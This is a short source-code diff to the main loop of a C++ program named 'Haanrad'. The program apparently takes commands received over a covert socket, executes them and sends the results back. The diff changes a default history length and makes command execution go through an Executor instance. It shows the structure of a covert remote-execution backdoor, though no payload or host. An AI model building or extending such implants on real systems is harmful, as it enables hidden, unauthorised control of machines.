@@ -83,7 +83,7 @@ int main(int argc, char * argv[]) {
 
     int historyLength = parcer.GetTagVal("-h", argv, argc);
     if(historyLength == -1){
-        historyLength = 10;
+        historyLength = 2;
     }
 
     string clientIP = parcer.GetTagData("-c", argv, argc);
@@ -167,6 +167,10 @@ int main(int argc, char * argv[]) {
     // 2) SystemState Evaluations
     // 3) Executing A Command With Executor
 
+
+    FileSystemManagerQueue * fileSystemManagerQueue = new FileSystemManagerQueue();
+    Executor * executor = new Executor(fileSystemManagerQueue);
+
     while(1){
         //hang on timer tick
         sleep(5);
@@ -192,7 +196,7 @@ int main(int argc, char * argv[]) {
                 Logger::debug("Main - There Was An Error Parsing The Haanrad Packet. Can't Execute");
             }else{
                 Logger::debug("Main - Parsing Successful. Now Executing");
-                string haanradPacket = Executor::execute(message);
+                string haanradPacket = executor->execute(message);
                 Logger::debug("Main - Execution Complete. Adding To Queue To Send Back");
                 covertSocketQueue->addPacketToSend(haanradPacket);
                 Logger::debug("Main - Adding To CovertSocketQueue Complete");
